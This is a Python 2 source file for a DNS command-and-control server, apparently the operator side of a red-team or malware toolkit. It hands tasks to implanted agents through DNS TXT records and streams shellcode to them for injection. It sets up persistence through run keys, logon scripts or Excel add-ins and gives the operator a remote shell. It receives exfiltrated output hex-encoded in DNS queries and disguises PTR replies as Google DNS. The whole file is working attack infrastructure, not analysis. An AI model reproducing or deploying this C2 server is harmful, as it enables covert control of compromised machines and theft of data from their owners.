from dnslib import *
import socket
import time
import threading
import cmd


interactedAgent = ""
activeAgents = []
agentCommands = {}

agentData = {}
agentTimes = {}
agentShellcode = {}

persistenceMethods = {"runkey":1,"logonscript":2,"exceladdin":3}



def sendTask(agent,command):
	agentCommands[agent].append([command,"WAITING"])
	
def addShellcode(agent,shellcodefile):
	# Error handling sucks will be improved in the future.
	try:
		f = open(shellcodefile,"r")
		shellcode = f.read()
		f.close()
		if(agentShellcode.has_key(agent)):
			print "[+] Replacing shellcode with the new one [+]"
		agentShellcode[agent] = "{!%s!}" % shellcode
		return True

	except Exception:
		print "[-] Shellcode file not found [-]"
		return False

	

def getInteractedAgent():
	global interactedAgent
	return interactedAgent

def changeInteractedAgent(agent):
	global interactedAgent
	interactedAgent = agent


class DNSListener(object):

	def __init__(self, host="127.0.0.1",port="53"):
		
		print "[+] Starting DNS Listener [+]"

		thread = threading.Thread(target=self.start_server, args=())
		thread.daemon = True # This will become false                           
		thread.start()  


		self.host = host
		self.port = port
		self.activeAgents = activeAgents

	def add_agent_times(self,agent):

		if(agentTimes.has_key(agent)):
			agentTimes[agent] = time.time()
		else:
			agentTimes.update({agent:time.time()})


	def get_agent_shellcode(self,agent):
		chunk = 64
		
		if(agentShellcode.has_key(agent)):
			if(len(agentShellcode[agent])>chunk):
				data = agentShellcode[agent][:chunk]
				agentShellcode[agent] = agentShellcode[agent][chunk:]
				
				return data
			else:
				data = agentShellcode[agent]
				del agentShellcode[agent]
				
				return data

		return "!@!"



	def get_agent_command(self,agent):
		# This code will return the data of the agent
		if(agentCommands.has_key(agent)):
				number_of_commands = len(agentCommands[agent])
				#print "Number of commands : %s" % number_of_commands
				if(number_of_commands>0):
					for command in agentCommands[agent]:
						#print command[1]
						if(command[1] == "WAITING"):
							command[1] = "DONE"
							return "CMD:%s" % (command[0])
				
				return "There were no commands :)"
		else:
			return "No agent with this name"


	def agent_probe(self,agent):
		try:
			if(agentCommands.has_key(agent)):
				if(len(agentCommands[agent]) > 0):
					i = 0
					for command in agentCommands[agent]:
						if(command[1] == "WAITING"):
							i = i + 1
					if (i == 0):
						agentCommands[agent] = []
					return "NR:%s" %  i

		except Exception,e:
			print "Error: %s" % e
			pass
		
		return "There were no commands :("

	def agent_receive_data(self,agent,response_data):
		global agentData

		if(not agentData.has_key(agent)):
			agentData.update({agent:""})

		# Processing of the data
		# Add if it starts with {! and ends with !} is a small value

		if(response_data.decode('hex').startswith("{!")):
			agentData[agent] = response_data[4:]
		elif(response_data.decode('hex').endswith("!}")):
			agentData[agent] += response_data[:-4]
			print "\n[+] Data from agent: %s [+]" % agent
			print agentData[agent].decode('hex')
			agentData[agent] = ""

		else:
			agentData[agent] += response_data

		
		return "RESP:OK"

	


	def parse_request_packet(self, agent, packetType, response_data=""):
		# This code will have the logic that will make the response
		# and decide what to do with the request
		
		# THIS IS A VERY TERRIBLE IMPLEMENTATION LOL
		if(packetType == "PROBE"):
			return self.agent_probe(agent)
		elif(packetType == "CMD"):
			return self.get_agent_command(agent)
		elif(packetType == "SHL"):
			return self.get_agent_shellcode(agent)
		elif(packetType == "DATA" and response_data != ""):
			return self.agent_receive_data(agent,response_data)

		return "Agent: %s packet %s" % (agent,packetType)


	def parse_dns_request(self,data):
		# Parse DNS Requests
		request = DNSRecord.parse(data)

		qtype = QTYPE[request.q.qtype]
		
		if(str(qtype) == "PTR"):
			return "PTR",0,request

		if((len(request.q.qname.label) <= 1) or (str(qtype) != "TXT")):
			#print "[-] Invalid Packet Received [-]"
			return 0,0,0
		else:
			name = request.q.qname.label[0]
			domain = request.q.qname.label[1]
			return name, domain , request

	def get_dns_response(self,request,data):
		
		reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
		reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(data)))
		return reply.pack()

	def get_dns_ptr_response(self,request):
		reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
		reply.add_answer(RR(request.q.qname, QTYPE.PTR, rdata=PTR("google-public-dns-b.google.com")))
		return reply.pack()

	def get_dns_data(self,data):
		#to be implemented


		self.data = data
		packetType = data.split("-")[1]
		agent = data.split("-")[0]
		
		# Add times for the latest probe.

		self.add_agent_times(agent)

		if(agent not in activeAgents):
			activeAgents.append(agent)
			print "\n[+] Agent %s called back [+]" % (agent)
			if(not agentCommands.has_key(agent)):
				agentCommands.update({agent:[]})
				# If there is no commands for agent replace them.
		if(len(data.split("-")) == 3 and packetType == "DATA"):
			response_data = data.split("-")[2]
			return self.parse_request_packet(agent,packetType,response_data)
		else:
			return self.parse_request_packet(agent,packetType)
		#return "packet type %s on agent %s" % (packetType, agent)

	def get_active_agents(self):
		return activeAgents

	def clear_agents(self):
		
		# This will clear agents that are in not active for at least 60 seconds
		while 1:
			time.sleep(5)
			for agent in activeAgents:
				if(agentTimes.has_key(agent)):
					if((time.time() - agentTimes[agent]) > 60):
						print "[-] Agent %s is offline [-]" % agent
						activeAgents.remove(agent)

	def start_server(self):

		# Create DNS Listener Socket
		self.dns_listener = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		self.dns_listener.bind((self.host,self.port))

		# This will clear the active agents and notify when the agent are not online
		agentClearThread = threading.Thread(target=self.clear_agents, args=())
		agentClearThread.daemon = True
		agentClearThread.start()

		while 1:
			

			data, address = self.dns_listener.recvfrom(1024)
			name, domain, request = self.parse_dns_request(data)
			if(name != 0 and domain !=0 and request !=0):
				#print name,domain
				#print "[+] Sending Response [+]"
				data = self.get_dns_data(name)
				reply = self.get_dns_response(request,data)
				self.dns_listener.sendto(reply,address)
			
			elif(name == "PTR"):
				# Send here PTR response
				reply = self.get_dns_ptr_response(request)
				self.dns_listener.sendto(reply,address)
				




# This the input part of the CMD lop


class Input(cmd.Cmd):

	AGENTS = activeAgents
	prompt = "DNS-C2 #> "
	def do_agents(self,s):
		self.list_agents()
	def do_interact(self,agent):
		self.AGENTS = activeAgents
		if(agent in self.AGENTS):
			print "[+] Interacting with : " + agent + " [+]"
			changeInteractedAgent(agent)
			agentInteraction = AgentCMD()
			agentInteraction.prompt = self.prompt + "(" + agent + "): "
			agentInteraction.cmdloop()
		else:
			print "[-] Agent not valid [-]"

	def complete_interact(self, text, line, begidx, endidx):
		if not text:
			completions = self.AGENTS[:]
		else:
			completions = [ f
			for f in self.AGENTS
			if f.startswith(text)
			]
		return completions
	def do_quit(self,s):
		exit(0)
	def emptyline(self):
		pass
	def list_agents(self):
		if(len(activeAgents)>0):
			print "[+] Number of agents : %s [+]" % len(activeAgents)
			for agent in activeAgents:
				print agent
		else:
			print "[-] No active agents [-]"

class AgentCMD(cmd.Cmd):

	# This is the Agent command line .
	def do_process_list(self,s):
		sendTask(interactedAgent,"PSL")
	def do_execute_shellcode(self,shellcodefile):
		if(addShellcode(interactedAgent,shellcodefile)):
			sendTask(interactedAgent,"INJ")
	def do_sysinfo(self,s):
		sendTask(interactedAgent,"SYS")
	def do_persist(self,s):
		if(persistenceMethods.has_key(s)):
				sendTask(interactedAgent,"PRT-%s" % persistenceMethods[s])
		else:
			print "\n[-] Invalid persistence method [-]"
			print "\nPersistence methods: "
			for key,value in persistenceMethods.iteritems():
				print "-> persist %s" % (key)
			print "\n"
	def do_shell(self,s):
		agent_shell = AgentShell()
		agent_shell.prompt = "SHELL #>(%s) " % interactedAgent
		agent_shell.cmdloop()

	def do_back(self,s):
		interactedAgent = ""
		return True
	def emptyline(self):
		pass

class AgentShell(cmd.Cmd):

	def emptyline(self):
		pass

	def onecmd(self,s):
		if(s == "exit" or s == "quit" or s == "back"):
			return True
		elif(s is None or s == ""):
			pass
		else:
			sendTask(interactedAgent, "ECM-%s" % s)

